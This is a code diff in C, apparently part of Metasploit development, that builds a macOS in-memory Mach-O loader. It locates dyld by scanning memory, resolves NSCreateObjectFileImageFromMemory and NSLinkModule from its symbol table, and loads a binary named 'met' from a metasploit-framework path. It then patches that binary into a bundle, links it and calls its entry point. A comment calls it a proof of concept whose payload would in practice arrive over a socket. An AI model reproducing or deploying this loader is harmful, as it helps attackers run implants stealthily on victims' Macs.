@@ -800,79 +800,231 @@ typedef int (*printf_ptr)(const char * format, ...);
 typedef void (*AudioServicesPlayAlertSound_ptr)(uint32_t inSystemSoundID);
 typedef NSObjectFileImageReturnCode (*NSCreateObjectFileImageFromMemory_ptr)(void *address, unsigned long size, NSObjectFileImage *objectFileImage);
 typedef NSModule (*NSLinkModule_ptr)(NSObjectFileImage objectFileImage, const char* moduleName, unsigned long options);
+int load_from_disk(char *filename, char **buf, unsigned int *size);
+int find_epc(unsigned long base, struct entry_point_command **entry);
+int find_macho(unsigned long addr, unsigned long *base, unsigned int increment, unsigned int dereference);
+unsigned long resolve_symbol(unsigned long base, char* symbol);
+
+#define EXECUTABLE_BASE_ADDR 0x100000000
+#define DYLD_BASE 0x00007fff5fc00000
 
 int main(int argc, char **argv, char **envp, char **apple)
 {
+  printf_ptr printf_func = printf;
+  printf_func("Hello world! %d,%d\n", SIGPIPE, SIG_IGN);
+
   void * dlsym_addr = get_dlsym_addr();
   dlsym_ptr dlsym_func = dlsym_addr;
 
-  printf_ptr printf_func = dlsym_func(RTLD_DEFAULT, "printf");
-  printf_func("Hello world! %d,%d\n", SIGPIPE, SIG_IGN);
+  uint64_t binary = 0;
+  uint64_t dyld = 0;
 
-  dlopen_ptr dlopen_func = dlsym_func(RTLD_DEFAULT, "dlopen");
-  printf_func("dlopen! %p\n", dlopen_func);
+  if(find_macho(EXECUTABLE_BASE_ADDR, &binary, 0x1000, 0)) return 1;
+  if(find_macho(binary + 0x1000, &dyld, 0x1000, 0)) return 1;
+
+  printf_func("dyld world! %p\n", dyld);
+
+  /*dlsym_func = resolve_symbol(dyld, 25, 0x4d6d6f72);*/
+
+  /*dlopen_ptr dlopen_func = dlsym_func(RTLD_DEFAULT, "dlopen");*/
+  /*printf_func("dlopen! %p\n", dlopen_func);*/
 
   /*printf_func("dlopen %p!\n", dlopen_func);*/
   /*void * handle = dlopen_func("/System/Library/Frameworks/AudioToolbox.framework/AudioToolbox", RTLD_NOW);*/
   /*printf_func("Audio %p!\n", handle);*/
   /*AudioServicesPlayAlertSound_ptr AudioServicesPlayAlertSound_func = dlsym_func(handle, "AudioServicesPlayAlertSound");*/
   /*printf_func("Audio %p!\n", AudioServicesPlayAlertSound_func);*/
-  /*[>AudioServicesPlayAlertSound_func(0x00000FFF);<]*/
+  /*AudioServicesPlayAlertSound_func(0x00000FFF);*/
   /*AudioServicesPlayAlertSound_func(0x000003ea);*/
 
-  NSCreateObjectFileImageFromMemory_ptr NSCreateObjectFileImageFromMemory_func = dlsym(RTLD_DEFAULT, "NSCreateObjectFileImageFromMemory");
+  /*NSCreateObjectFileImageFromMemory_ptr NSCreateObjectFileImageFromMemory_func = dlsym_func(RTLD_DEFAULT, "NSCreateObjectFileImageFromMemory");*/
+  NSCreateObjectFileImageFromMemory_ptr NSCreateObjectFileImageFromMemory_func = resolve_symbol(dyld, "_NSCreateObjectFileImageFromMemory");
   printf_func("image %p!\n", NSCreateObjectFileImageFromMemory_func);
 
-  /*NSObjectFileImageReturnCode(*create_file_image_from_memory)(const void *, size_t, NSObjectFileImage *) = NULL;*/
-  /*NSModule (*link_module)(NSObjectFileImage, const char *, unsigned long) = NULL;*/
+  /*NSLinkModule_ptr NSLinkModule_func = dlsym_func(RTLD_DEFAULT, "NSLinkModule");*/
+  NSLinkModule_ptr NSLinkModule_func = resolve_symbol(dyld, "_NSLinkModule");
+  printf_func("link %p!\n", NSLinkModule_func);
 
-	/*create_file_image_from_memory = (NSObjectFileImageReturnCode (*)(const void *, size_t, NSObjectFileImage *)) addr;*/
-	/*link_module = (NSModule (*)(NSObjectFileImage, const char *, unsigned long)) addr;*/
+	// Load the binary specified by filename using dyld
+	char *binbuf = NULL;
+	unsigned int size;
 
-	/*// change the filetype to a bundle*/
-	/*int type = ((int *)binbuf)[3];*/
-	/*if(type != 0x8) ((int *)binbuf)[3] = 0x8; //change to mh_bundle type*/
+  if(load_from_disk("/Users/user/dev/git/metasploit-framework/met", &binbuf, &size)) {
+    printf_func("load failed!\n");
+    return 1;
+  }
+	// change the filetype to a bundle
+	int type = ((int *)binbuf)[3];
+	if(type != 0x8) ((int *)binbuf)[3] = 0x8; //change to mh_bundle type
 
-	/*// create file image*/
-	/*NSObjectFileImage fi; */
-	/*if(create_file_image_from_memory(binbuf, size, &fi) != 1) {*/
-		/*fprintf(stderr, "Could not create image.\n");*/
-		/*goto err;*/
-	/*}*/
+	// create file image
+	NSObjectFileImage fi; 
+	if(NSCreateObjectFileImageFromMemory_func(binbuf, size, &fi) != 1) {
+    printf_func("image failed!\n");
+    return 1;
+	}
 
-	/*// link image*/
-	/*NSModule nm = link_module(fi, "mytest", NSLINKMODULE_OPTION_PRIVATE |*/
-														/*NSLINKMODULE_OPTION_BINDNOW);*/
-	/*if(!nm) {*/
-		/*fprintf(stderr, "Could not link image.\n");*/
-		/*goto err;*/
-	/*}*/
+	// link image
+	NSModule nm = NSLinkModule_func(fi, "mytest", NSLINKMODULE_OPTION_PRIVATE | NSLINKMODULE_OPTION_BINDNOW);
+	if(!nm) {
+    printf_func("link failed!\n");
+    return 1;
+	}
+  /*printf_func("type %d!\n", type);*/
 
 	/*// find entry point and call it*/
-	/*if(type == 0x2) { //mh_execute*/
-		/*unsigned long execute_base;*/
-		/*struct entry_point_command *epc;*/
+  if(type == 0x2) { //mh_execute
+    unsigned long execute_base;
+    struct entry_point_command *epc;
 
-		/*if(find_macho((unsigned long)nm, &execute_base, sizeof(int), 1)) {*/
-			/*fprintf(stderr, "Could not find execute_base.\n");*/
-			/*goto err;*/
-		/*}*/
+    /*printf_func("nm %p!\n", *(uint32_t*)nm);*/
 
-		/*if(find_epc(execute_base, &epc)) {*/
-			/*fprintf(stderr, "Could not find ec.\n");*/
-			/*goto err;*/
-		/*}*/
+    if(find_macho((unsigned long)nm, &execute_base, sizeof(int), 1)) {
+    printf_func("find failed!\n");
+      return 3;
+    }
 
-		/*int(*main)(int, char**, char**, char**) = (int(*)(int, char**, char**, char**))(execute_base + epc->entryoff); */
-		/*char *argv[]={"test", NULL};*/
-		/*int argc = 1;*/
-		/*char *env[] = {NULL};*/
-		/*char *apple[] = {NULL};*/
-		/*return main(argc, argv, env, apple);*/
+    if(find_epc(execute_base, &epc)) {
+    printf_func("epc failed!\n");
+      return 4;
+    }
+
+    int(*main)(int, char**, char**, char**) = (int(*)(int, char**, char**, char**))(execute_base + epc->entryoff);
+    char *argv[]={"test", NULL};
+    int argc = 1;
+    char *env[] = {NULL};
+    char *apple[] = {NULL};
+    return main(argc, argv, env, apple);
+  }
 
   return 0;
 }
 
+unsigned long resolve_symbol(unsigned long base, char* symbol) {
+	// Parse the symbols in the Mach-O image at base and return the address of the one
+	// matched by the offset / int pair (offset, match)
+	struct load_command *lc;
+	struct segment_command_64 *sc, *linkedit, *text;
+	struct symtab_command *symtab;
+	struct nlist_64 *nl;
+
+	char *strtab;
+
+	symtab = 0;
+	linkedit = 0;
+	text = 0;
+
+	lc = (struct load_command *)(base + sizeof(struct mach_header_64));
+	for(int i=0; i<((struct mach_header_64 *)base)->ncmds; i++) {
+		if(lc->cmd == 0x2/*LC_SYMTAB*/) {
+			symtab = (struct symtab_command *)lc;
+		} else if(lc->cmd == 0x19/*LC_SEGMENT_64*/) {
+			sc = (struct segment_command_64 *)lc;
+			switch(*((unsigned int *)&((struct segment_command_64 *)lc)->segname[2])) { //skip __
+			case 0x4b4e494c:	//LINK
+				linkedit = sc;
+				break;
+			case 0x54584554:	//TEXT
+				text = sc;
+				break;
+			}
+		}
+		lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
+	}
+
+	if(!linkedit || !symtab || !text) return -1;
+
+	unsigned long file_slide = linkedit->vmaddr - text->vmaddr - linkedit->fileoff;
+	strtab = (char *)(base + file_slide + symtab->stroff);
+
+	nl = (struct nlist_64 *)(base + file_slide + symtab->symoff);
+	for(int i=0; i<symtab->nsyms; i++) {
+		char *name = strtab + nl[i].n_un.n_strx;
+    /*printf("sym %s\n", name);*/
+    if (string_compare(name, symbol) == 0) {
+		/*if(*(unsigned int *)&name[offset] == match) {*/
+      return base + nl[i].n_value;
+			/*if(is_sierra()) {*/
+				/*return base + nl[i].n_value;*/
+			/*} else {*/
+				/*return base - DYLD_BASE + nl[i].n_value;*/
+			/*}*/
+		}
+	}
+
+	return -1;
+}
+
+int find_macho(unsigned long addr, unsigned long *base, unsigned int increment, unsigned int dereference) {
+	unsigned long ptr;
+
+	// find a Mach-O header by searching from address.
+	*base = 0;
+		
+	while(1) {
+		ptr = addr;
+		if(dereference) ptr = *(unsigned long *)ptr;
+		chmod((char *)ptr, 0777);
+		if(errno == 2 /*ENOENT*/ &&
+			((int *)ptr)[0] == 0xfeedfacf /*MH_MAGIC_64*/) {
+			*base = ptr;
+			return 0;
+		}
+
+		addr += increment;
+	}
+	return 1;
+}
+
+int find_epc(unsigned long base, struct entry_point_command **entry) {
+	// find the entry point command by searching through base's load commands
+
+	struct mach_header_64 *mh;
+	struct load_command *lc;
+
+	unsigned long text = 0;
+
+	*entry = NULL;
+
+	mh = (struct mach_header_64 *)base;
+	lc = (struct load_command *)(base + sizeof(struct mach_header_64));
+	for(int i=0; i<mh->ncmds; i++) {
+		if(lc->cmd == LC_MAIN) {	//0x80000028
+			*entry = (struct entry_point_command *)lc;
+			return 0;
+		}
+
+		lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
+	}
+
+	return 1;
+}
+int load_from_disk(char *filename, char **buf, unsigned int *size) {
+	/*
+	 What, you say?  this isn't running from memory!  You're loading from disk!!
+	 Put down the pitchforks, please.  Yes, this reads a binary from disk...into 
+	 memory.  The code is then executed from memory.  This here is a POC; in
+	 real life you would probably want to read into buf from a socket. 
+	 */
+	int fd;
+	struct stat s;
+
+	if((fd = open(filename, O_RDONLY)) == -1) return 1;
+	if(fstat(fd, &s)) return 1;
+	
+	*size = s.st_size;
+
+	if((*buf = mmap(NULL, (*size) * sizeof(char), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON, -1, 0)) == MAP_FAILED) return 1;
+	if(read(fd, *buf, *size * sizeof(char)) != *size) {
+		free(*buf);
+		*buf = NULL;
+		return 1;
+	}
+
+	close(fd);
+
+	return 0;
+}
 int string_compare(const char* s1, const char* s2) {
   while (*s1 != '\0' && *s1 == *s2)
   {
@@ -941,7 +1093,7 @@ void * get_dlsym_addr()
         /*}*/
         /*i++;*/
       /*}*/
-      /*scc_write(STDOUT_FILENO, pathFile, 10);*/
+      /*scc_write(STDOUT_FILENO, pathFile, strlen(pathFile));*/
       if (string_compare(pathFile, "/usr/lib/system/libdyld.dylib") == 0) {
         libdyld_address = (dcimg->address + vm_slide_offset);
         break;
